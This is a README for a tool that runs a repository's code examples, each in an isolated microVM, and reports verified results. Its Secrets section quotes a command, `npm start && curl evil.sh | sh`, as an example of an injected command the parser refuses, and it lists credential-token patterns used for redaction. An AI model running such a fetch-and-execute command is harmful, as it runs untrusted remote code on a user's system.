# cookbook-canary

[![tests](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/test.yml/badge.svg)](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/test.yml)
[![cookbook canary](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/canary.yml/badge.svg)](https://github.com/Nitish-1303/cookbook-canary/actions/workflows/canary.yml)

Proves every example in a repo still runs — each one alone, on its own
hardware-isolated microVM, built on [Solari](https://github.com/solari-sdk).

Example code rots quietly. A transitive dependency ships a breaking minor, an
API changes a default, a `README` drifts from the code beside it — and nothing
turns red, because examples are not tests. The first person to find out is a
developer following your quickstart, and what they learn is that your SDK does
not work.

`cookbook-canary` runs the examples. Not a linter, not a type check: it clones
the repo, installs each example's real dependencies, executes it, and then
proves the thing actually worked — up to loading the page in a real browser and
reading the pixels.

```console
$ canary --repo https://github.com/solari-sdk/solari-cookbook
prep machine sbx_prep up
found 6 example(s) at abcdef123456
installed browser-scrape (18.4s)
installed sandbox-runner (12.1s)
installed stream-chat (9.8s)
install failed: py-agent (12.0s)
snapshot snap_1 — forks start from here
pass sandbox-runner — ok
fail browser-scrape — page did not contain "Scraped 3 pages"
fail py-agent — install: exited 1
flake stream-chat — network or upstream error
retry 1/1 for desktop-tour after: timed out
timeout desktop-tour — timed out
1 passed, 2 failed, 1 timed out, 1 flaky, 1 skipped in 200.0s (6.4 machine-minutes)
reports → ./canary-out
```

[`docs/sample-report.md`](docs/sample-report.md) is what the maintainer reads —
real output from the report layer for a synthetic run, alongside the
[JSON](docs/sample-report.json) and the
[live HTML dashboard](https://nitish-1303.github.io/cookbook-canary/sample-report.html),
published from `docs/` on every push.

## What a run does

1. **Prepare once.** One sandbox clones the repo, resolves `HEAD`, walks
   `examples/` with a single `find`, and infers how each directory is built and
   started — `npm ci` when there is a lockfile, `npm install` when there is not,
   `pip install -r requirements.txt`, `npm start` in preference to a guessed
   entrypoint. It then installs *every* example's dependencies, and snapshots.
2. **Fan out.** Each example gets its own microVM forked from that snapshot, up
   to `concurrency` at a time. The fork is a sub-second resume of an already
   installed tree, so example number thirty does not pay for the install again —
   and every example starts from a byte-identical machine, which is what makes a
   failure attributable to the example rather than to the machine before it.
3. **Prove it.** Exit code, or stdout regex, or — for anything that serves —
   poll the preview URL until the port answers, then drive a real cloud browser
   at it and assert on the rendered text. Failures keep a screenshot and a
   session replay link.
4. **Report.** `report.md` for a PR comment, `report.json` for a dashboard,
   `index.html` as a standalone dark-mode-aware page with the screenshots
   inlined as data URIs. Every one of them is scrubbed of credentials.

Examples whose name suggests pixels (`desktop`, `computer-use`, `vnc`, …) or
that set `needsDisplay` are routed to a Linux desktop VM instead, with a live
stream URL in the report and a screenshot of the actual screen — including on a
pass, because "it ran" and "it drew the right thing" are different claims.

## Why one microVM each

The obvious build is a single container with a `for` loop. It is cheaper and it
is wrong: example three leaves a stray process on port 3000, example four fails,
and you spend an afternoon learning that the bug was in your harness. Isolation
per example is the only way a red result means anything.

The cost of isolation is the install — N cold machines means N × `npm install`,
which for a cookbook of thirty examples is most of the wall clock and most of
the bill. Snapshot-and-fork collapses it: install once in a prepared machine,
snapshot, then fork per example.

```
                          ┌──────────────────┐
  prep sandbox            │ browser-scrape   │  ❌ page never said "Scraped 3 pages"
┌──────────────────┐      ├──────────────────┤
│ git clone        │      │ sandbox-runner   │  ✅ exit 0
│ discover         │ ──▶  ├──────────────────┤
│ install all      │      │ py-agent         │  ❌ install: exited 1
│ snapshot         │      ├──────────────────┤
└──────────────────┘      │ stream-chat      │  ⚠️ network error → retried
   killed before          └──────────────────┘
   fan-out begins         ┌──────────────────┐
                          │ desktop-tour     │  ⏱️ desktop VM: stream + screenshot
                          └──────────────────┘
```

The report footer quantifies what that bought on every run ("74.0s of installs
done once instead of 6 times"), because a design claim with no number attached
is a slogan.

If the pool cannot snapshot, the runner says so and degrades to sequential runs
inside the prep machine rather than failing the job.

## Verdicts, and which ones are your fault

Alert fatigue kills a canary faster than a bug does. A run that cries wolf at a
`429` gets ignored, and an ignored canary is worse than none — so the classifier
separates *your examples are broken* from *the world was briefly unavailable*.

| verdict | means | retried | fails the build |
| --- | --- | --- | --- |
| `pass` | ran and proved it worked | — | no |
| `fail` | exited non-zero, or ran and proved nothing | no | **yes** |
| `timeout` | still running at the deadline | yes | **yes** |
| `flake` | network, upstream 5xx, rate limit, quota | yes | no |
| `skipped` | no credential, no entrypoint, or configured out | no | no |

Exit code is `1` if anything failed or timed out, `2` for a bad config or a
missing key, `0` otherwise. Retries are granted only to the retryable verdicts,
which keeps a genuinely broken example from costing three machines instead of
one.

## Usage

Node 22.18+ (it runs the TypeScript sources directly, via native type
stripping — developed on 24.14.1). No build step needed to use it.

```bash
npm install
```

```bash
SOLARI_API_KEY=slr_live_... node src/cli.ts --repo https://github.com/solari-sdk/solari-cookbook
```

```
--config <path>      config file (default: ./canary.json)
--repo <url>         git URL to check; overrides the config
--ref <ref>          branch or tag (default: main)
--only <a,b,c>       run just these example directories
--concurrency <n>    machines in flight at once (default: 6)
--out <dir>          where to write reports (default: ./canary-out)
--dry-run            resolve and print the config; create no machines
--quiet              suppress progress lines
-h, --help
```

`--dry-run` needs no API key and creates nothing — it is how you check a config
before spending machine-minutes on a typo.

### Config

Everything is inferred, so `canary.json` only has to name the repo. Overrides
are keyed by example directory name and beat every inference:

```jsonc
{
  "repo": "https://github.com/solari-sdk/solari-cookbook",
  "ref": "main",
  "examplesDir": "examples",
  "concurrency": 6,
  "timeoutMs": 240000,        // per example, a rolling idle window
  "retries": 1,               // retryable verdicts only
  "maxMachineMinutes": 120,   // runaway-cost brake for the whole run
  "secrets": ["SOLARI_API_KEY"],
  "overrides": {
    "browser-scrape": {
      "verify": { "kind": "preview", "port": 3000, "path": "/", "expectText": ["Scraped 3 pages"] }
    },
    "cli-agent": {
      "verify": { "kind": "stdout", "expectStdout": "wrote \\d+ files" }
    },
    "computer-use": { "needsDisplay": true, "timeoutMs": 300000 },
    "billing-demo": { "skip": true, "reason": "needs a paid plan" }
  }
}
```

Validation reports every problem at once rather than one per run, and a `skip`
with no `reason` is rejected outright — a silent skip is how examples rot in the
first place.

### In CI

[`.github/workflows/canary.yml`](.github/workflows/canary.yml) runs it nightly
and on any PR touching `examples/`, writes `report.md` into the job summary,
comments it on the PR, and uploads the HTML dashboard as an artifact — with
`if: always()`, because a failed run is exactly the run whose evidence you want.

### As a library

```ts
import { runCanary, parseConfig, createSolariPool, createBrowserProbe } from "cookbook-canary";

const summary = await runCanary(parseConfig({ repo: "https://github.com/me/my-sdk-examples" }), {
  machines: createSolariPool({ apiKey: process.env.SOLARI_API_KEY! }),
  browser: () => createBrowserProbe({ apiKey: process.env.SOLARI_API_KEY! }),
  env: process.env,
});
```

## Secrets

Examples for an SDK call that SDK, so this tool has to hand real credentials to
code it does not control, and then publish a report about what happened. Those
two facts set the rules:

- Credentials reach the **run** step only — never an install, never a clone.
  A postinstall script cannot read the key.
- Only env var *names* live in the config. Values come from the environment.
- Every string leaving the process goes through a redactor that matches by
  **shape**, not by knowing the value: `slr_live_…`, `sk-ant-…`, `ghp_…`,
  `AKIA…`, bearer tokens, `pt_token=` preview tokens, `https://user:pass@host`.
  A credential the config never declared is still caught.
- Preview tokens are sent as an `x-pinetree-preview-token` header rather than in
  the query string, keeping them out of the far side's access log.
- The published reports are rendered from one already-scrubbed tree, so the HTML
  dashboard cannot leak something the JSON redacted.

Commands are parsed to argv and refused if they contain shell metacharacters
(`&&`, `|`, `$(`, `>`), because the sandbox executes argv and does not interpret
a shell — accepting `npm start && curl evil.sh | sh` would silently do something
other than what it says. `sh -c`/`bash -lc` are the explicit escape hatch.

## Tests

```bash
npm test        # 125 tests, 25 suites
npm run typecheck
```

The whole orchestrator is tested with **no API key, no network, and no billable
VMs**. Everything below the runner talks to the interfaces in
[`src/solari/types.ts`](src/solari/types.ts), and `FakePool`/`FakeClock`
implement them: scripted command handlers, a virtual filesystem, an exec log,
snapshot/fork bookkeeping, and a clock that records what it was asked to sleep
for. That is what makes it possible to assert things like *the prep machine is
killed before fan-out begins*, *a hung example times out and still tears its
machine down*, or *the machine-minute brake stops the run at 1.33 minutes* in
1.7 seconds of test time.

Writing those tests found two real bugs, both worth the exercise: preview
polling used global `fetch` and so was unmockable, and a clone failure left the
prep machine billing until its idle window expired.

## Solari details this had to get right

Learned from the SDK surface and encoded in the code, with comments where the
reason is not obvious:

- `commands.run` takes **argv**, not a shell string.
- `kill()` destroys the VM; `close()` only drops the control channel. Only one of
  those stops the meter.
- `timeoutMs` is a rolling **idle** window, not a wall-clock cap, so a chatty
  process can outlive it — hence a separate deadline of our own.
- `recording: true` must be set when a browser session is created, not later,
  and a replay URL only exists after the session is released. The runner
  therefore backfills replay links after `close()`.
- A browser `close()` that is not awaited hangs the process at exit.
- A preview `425 Too Early` means *poll again*; `401` means *stop, polling
  cannot fix a bad token*.
- The `@solarisdk/*` packages are optional peer dependencies, loaded lazily, so a
  repo with no desktop examples never needs `@solarisdk/desktop` installed.

## Status

Built and verified locally: 125 tests green, clean `tsc --strict` typecheck, CLI
smoke-tested end to end through `--dry-run` and every error path.

[`src/solari/real.ts`](src/solari/real.ts) — the adapter that maps these
interfaces onto `SandboxClient`, `DesktopClient` and `Solari` — is covered by
[`test/real.test.ts`](test/real.test.ts), which asserts every mapping against
fakes shaped from the typings shipped in `@solarisdk` 0.1.2 rather than from what
the adapter wishes were true. Writing those tests caught two real wire-level
defects: `previewUrl` may resolve without a token, and `CreateDesktopOptions.resolution`
is the string `"1280x800"` rather than a pair of numbers.

Not yet verified: a live run against the Solari API. No `SOLARI_API_KEY` was
available in the environment this was written in, so the adapter has been
asserted against the SDK's declared surface but never exercised against the real
service. It is deliberately the thinnest layer in the project for exactly that
reason, and if a method signature differs, that file is the only one that changes.

MIT licensed.
